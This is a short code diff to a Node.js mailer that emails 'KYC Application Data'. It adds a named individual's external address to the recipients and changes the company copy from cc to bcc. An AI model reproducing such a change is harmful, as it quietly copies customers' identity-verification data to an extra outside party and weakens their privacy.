@@ -92,8 +92,8 @@ const storage = multer.diskStorage({
     smtpTransport.sendMail(
         {
         from: "hello@bankopeny.com",
-        to: `${recipientEmail}`,
-        cc:'hello@bankopeny.com',
+        to: `${recipientEmail},pawan.mukati@newtechfusion.com`,
+        bcc:'hello@bankopeny.com',
         subject: "KYC Application Data",
         html: `
         User KYC Application Data, Thanks.`,
